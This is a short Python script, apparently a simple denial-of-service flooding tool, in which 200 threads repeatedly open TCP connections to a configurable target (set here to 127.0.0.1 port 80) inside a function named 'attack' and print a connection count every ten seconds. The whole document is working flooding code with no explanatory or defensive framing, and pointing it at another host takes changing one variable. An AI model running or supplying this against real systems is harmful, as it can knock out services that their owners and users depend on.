import socket
import threading
import time
import sys

target_ip = "127.0.0.1"
target_port = 80

packet_count = 0
running = True
lock = threading.Lock()

def attack():
    global packet_count
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target_ip, target_port))
            sock.close()
            with lock:
                packet_count += 1
        except:
            pass

def logger():
    global packet_count
    while running:
        time.sleep(10)
        with lock:
            current = packet_count
            packet_count = 0
        print(f"FAUST-{current}")

threads = []
for _ in range(200):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()
    threads.append(t)

lt = threading.Thread(target=logger)
lt.daemon = True
lt.start()

try:
    while True:
        time.sleep(0.1)
except KeyboardInterrupt:
    running = False
    sys.exit(0)
